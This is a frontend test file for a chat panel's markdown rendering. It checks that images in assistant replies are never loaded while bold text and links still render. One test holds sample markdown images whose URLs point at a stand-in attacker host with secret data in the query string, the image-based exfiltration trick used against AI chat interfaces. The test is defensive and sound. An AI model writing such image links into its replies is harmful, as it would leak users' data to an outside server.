import { afterEach, describe, expect, it, vi } from 'vitest';
import { cleanup, render, screen } from '@testing-library/react';
import { MantineProvider } from '@mantine/core';
import { ChatPanel } from '../../src/components/ChatPanel';
import { useChatStore } from '../../src/store/chat';

window.matchMedia = vi.fn().mockReturnValue({
  matches: false,
  addEventListener: vi.fn(),
  removeEventListener: vi.fn(),
});
globalThis.ResizeObserver = class {
  observe() {}
  unobserve() {}
  disconnect() {}
};
Element.prototype.scrollTo = vi.fn();

function renderReply(content: string) {
  useChatStore.setState({ sessions: [], activeSessionId: null });
  useChatStore.getState().createSession('Session 1');
  useChatStore.getState().addMessage({ role: 'assistant', content });
  return render(
    <MantineProvider>
      <ChatPanel />
    </MantineProvider>,
  );
}

describe('chat reply markdown', () => {
  afterEach(() => {
    cleanup();
    useChatStore.setState({ sessions: [], activeSessionId: null });
  });

  it('loads no image a reply points at', () => {
    const { container } = renderReply(
      'before ![x](https://attacker.example/leak?d=secret) and ![y][ref] after\n\n' +
        '[ref]: https://attacker.example/leak2',
    );

    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('attacker.example');
    expect(screen.getByTestId('chat-line').textContent).toContain('before');
    expect(screen.getByTestId('chat-line').textContent).toContain('after');
  });

  it('still renders the rest of the markdown', () => {
    renderReply('**bold** and [a link](https://example.com)');

    expect(screen.getByText('bold').tagName).toBe('STRONG');
    expect(screen.getByText('a link').getAttribute('href')).toBe('https://example.com');
  });
});
